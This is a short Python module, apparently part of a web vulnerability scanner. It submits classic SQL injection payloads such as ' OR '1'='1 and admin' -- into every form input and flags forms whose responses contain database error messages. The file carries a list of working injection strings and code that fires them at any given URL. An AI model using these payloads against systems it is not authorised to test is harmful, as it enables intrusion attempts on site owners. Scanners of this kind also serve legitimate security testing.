import requests
from urllib.parse import urljoin

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml"
}

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin' --",
    "' OR 'a'='a"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite error",
    "syntax error",
    "ora-01756"
]


def is_vulnerable(response_text):
    response_text = response_text.lower()
    for error in SQL_ERRORS:
        if error in response_text:
            return True
    return False


def scan_sql_injection(url, forms):
    vulnerable_forms = []

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        target_url = urljoin(url, action)

        for payload in SQL_PAYLOADS:
            data = {}

            for input_tag in form["inputs"]:
                if input_tag["name"]:
                    data[input_tag["name"]] = payload

            try:
                if method == "post":
                    res = requests.post(target_url, data=data, headers=HEADERS, timeout=5)
                else:
                    res = requests.get(target_url, params=data, headers=HEADERS, timeout=5)

                if is_vulnerable(res.text):
                    vulnerable_forms.append({
                        "action": action,
                        "method": method,
                        "payload": payload
                    })
                    break

            except requests.exceptions.RequestException:
                pass

    return vulnerable_forms
